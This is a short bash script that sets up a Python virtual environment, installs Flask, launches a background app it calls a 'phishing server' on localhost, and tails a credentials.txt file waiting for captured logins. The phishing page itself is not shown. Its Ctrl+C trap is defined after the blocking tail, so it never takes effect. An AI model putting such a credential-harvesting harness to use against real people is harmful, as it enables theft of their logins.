#!/bin/bash

echo "[*] Creating virtual environment..."
python3 -m venv venv

echo "[*] Activating environment..."
source venv/bin/activate

echo "[*] Installing Flask..."
pip install flask > /dev/null

echo "[*] Launching phishing server..."
python3 app.py &
APP_PID=$!
sleep 2

echo "[*] Server running at http://127.0.0.1:8080"
echo "[*] Waiting for credentials... (Ctrl+C to stop)"
echo

touch credentials.txt
tail -f credentials.txt

# Stop server on Ctrl+C
trap ctrl_c INT
function ctrl_c() {
    echo "[!] Stopping server..."
    kill $APP_PID
    deactivate
    exit 0
}
